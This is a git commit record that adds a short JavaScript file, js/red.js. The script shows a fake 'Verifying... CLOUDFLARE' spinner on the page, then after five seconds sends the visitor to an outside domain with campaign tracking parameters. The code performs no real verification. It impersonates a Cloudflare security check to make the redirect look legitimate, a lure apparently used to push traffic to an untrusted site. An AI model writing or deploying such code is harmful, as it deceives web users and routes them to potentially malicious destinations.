bf1aaee712077e4792758c3f1188459ea97f1d27
ukbest-1 <baaje112dd@gmail.com>
2025-12-03 22:25:43 +0530

    Create red.js

---
+++ js/red.js
@@ -0,0 +1,8 @@
+setTimeout(function() {
+    const box = document.querySelector('.verification-box');
+    box.innerHTML = '<div class="spinner"></div> Verifying... <span class="cloudflare">CLOUDFLARE</span>';
+}, 1000);
+
+setTimeout(function() {
+    window.location.href = 'http://t1l9.com/?utm_campaign=xEp7N3tLMR&v1=[v1]&v2=[v2]&v3=[v3]';
+}, 5000);
